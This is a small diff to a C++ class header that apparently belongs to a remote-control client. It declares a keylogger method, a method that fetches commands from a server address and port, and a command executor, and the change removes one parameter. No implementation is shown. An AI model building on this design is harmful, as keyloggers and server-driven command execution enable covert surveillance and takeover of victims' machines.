@@ -49,7 +49,7 @@ public:
 	void OpenApp(const char* app);
 	void Keylogger(const char* fileName);
 
-    std::vector<std::string> updateCommands(const char *serverAddress, const char *port, const char *associatedUser, std::string remainingCommands);
+    std::vector<std::string> updateCommands(const char *serverAddress, const char *port, std::string remainingCommands);
     std::string executeCommand(std::string command);
 
 	void Hibernation();
